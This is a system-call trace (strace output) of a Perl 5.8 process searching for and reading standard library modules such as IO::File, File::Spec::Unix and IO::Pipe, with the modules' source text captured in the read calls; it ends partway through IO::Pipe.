8463  07:23:33.133331 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8463  07:23:33.133351 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d72000
8463  07:23:33.133366 mmap2(0xb7d75000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d75000
8463  07:23:33.133396 close(8)          = 0
8463  07:23:33.133607 read(6, "", 4096) = 0
8463  07:23:33.133621 close(6)          = 0
8463  07:23:33.133653 stat64("/etc/perl/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133668 stat64("/etc/perl/IO/File.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133682 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133695 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133709 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133734 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133779 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133806 stat64("/usr/lib/perl5/IO/File.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133820 stat64("/usr/share/perl5/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133833 stat64("/usr/share/perl5/IO/File.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133847 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.133860 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
8463  07:23:33.133882 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.133910 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.133922 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.133940 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
8463  07:23:33.134178 stat64("/etc/perl/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134194 stat64("/etc/perl/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134208 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134231 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134273 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134286 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134314 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134326 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134339 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134351 stat64("/usr/share/perl5/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134365 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134377 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134390 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134403 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
8463  07:23:33.134424 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.134438 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.134449 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.134467 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
8463  07:23:33.134541 stat64("/etc/perl/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134555 stat64("/etc/perl/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134567 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134580 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134593 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134606 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134624 stat64("/usr/lib/perl5/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134635 stat64("/usr/lib/perl5/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134648 stat64("/usr/share/perl5/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134660 stat64("/usr/share/perl5/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134672 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134684 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134697 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.134718 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
8463  07:23:33.134771 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
8463  07:23:33.134785 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb24c8) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.134813 _llseek(10, 0, [0], SEEK_CUR) = 0
8463  07:23:33.134848 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
8463  07:23:33.134959 stat64("/etc/perl/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.134974 stat64("/etc/perl/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.134987 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135000 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135014 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135027 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135041 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135053 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135067 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135079 stat64("/usr/share/perl5/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135093 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135105 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfbb220c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135119 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfbb22fc) = -1 ENOENT (No such file or directory)
8463  07:23:33.135136 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
8463  07:23:33.135157 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
8463  07:23:33.135171 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2018) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.135182 _llseek(11, 0, [0], SEEK_CUR) = 0
8463  07:23:33.135199 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
8463  07:23:33.135430 read(11, "", 4096) = 0
8463  07:23:33.135444 close(11)         = 0
8463  07:23:33.135638 _llseek(10, 1148, [1148], SEEK_SET) = 0
8463  07:23:33.135654 _llseek(10, 0, [1148], SEEK_CUR) = 0
8463  07:23:33.135664 close(10)         = 0
8463  07:23:33.135769 _llseek(8, 594, [594], SEEK_SET) = 0
8463  07:23:33.135818 _llseek(8, 0, [594], SEEK_CUR) = 0
8463  07:23:33.135828 close(8)          = 0
8463  07:23:33.135862 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135877 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135891 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135904 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135918 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135931 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135946 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135958 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135972 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135984 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.135997 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.136010 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.136024 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.136037 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
8463  07:23:33.136058 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.136073 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.136085 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.136103 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
8463  07:23:33.136894 brk(0x8218000)    = 0x8218000
8463  07:23:33.137036 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
8463  07:23:33.137480 read(8, "", 4096) = 0
8463  07:23:33.137496 close(8)          = 0
8463  07:23:33.137683 read(6, "", 4096) = 0
8463  07:23:33.137698 close(6)          = 0
8463  07:23:33.137932 stat64("/etc/perl/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.137950 stat64("/etc/perl/IO/Pipe.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.137964 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.137977 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.137991 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138004 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138017 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138029 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138046 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138058 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138071 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.138083 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
8463  07:23:33.138105 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.138119 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.138130 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.138150 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 